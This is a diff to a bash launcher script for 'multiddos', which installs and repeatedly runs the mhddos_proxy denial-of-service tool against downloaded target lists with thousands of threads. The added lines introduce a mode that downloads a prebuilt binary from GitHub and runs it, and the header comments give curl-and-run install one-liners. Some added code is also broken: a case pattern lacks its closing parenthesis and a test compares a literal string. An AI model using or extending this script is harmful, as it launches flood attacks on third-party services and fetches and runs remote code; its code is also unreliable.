@@ -1,7 +1,7 @@
 #!/bin/bash
 # curl -LO tiny.one/multiddos && bash multiddos
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... v1.1d\n"
+clear && echo -e "Loading... v1.2\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux jq git toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
@@ -115,6 +115,7 @@ while [ "$1" != "" ]; do
         --XL ) export ddos_size="XL"; shift ;;
         --XXL  | --2XL) export ddos_size="XXL"; shift ;;
         --XXXL | --3XL) export ddos_size="XXXL"; shift ;;
+        --new export mode="new"; shift ;;
         -p | --proxy-threads ) export proxy_finder="on"; export proxy_threads="$2"; shift 2 ;;
         *   ) export args_to_pass+=" $1"; shift ;; #pass all unrecognized arguments to mhddos_proxy
     esac
@@ -127,7 +128,12 @@ cd ~/multidd
 cat > auto_bash.sh << 'EOF'
 # Restart and update mhddos_proxy and targets every 30 minutes
 while true; do
-    #install mhddos_proxy
+
+if [[ mode == "new" ]]; then
+    cd ~/multidd/
+    wget https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux
+    bash mhddos_proxy_linux
+else
     cd ~/multidd/
     git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
     cd ~/multidd/mhddos_proxy
@@ -171,7 +177,7 @@ while true; do
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xac.uaripper $methods -t 5000 $args_to_pass &
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xad.uaripper $methods -t 5000 $args_to_pass &
     fi
-    
+fi
 sleep 60m
 pkill -f start.py; pkill -f runner.py;
 prepare_targets_and_banner
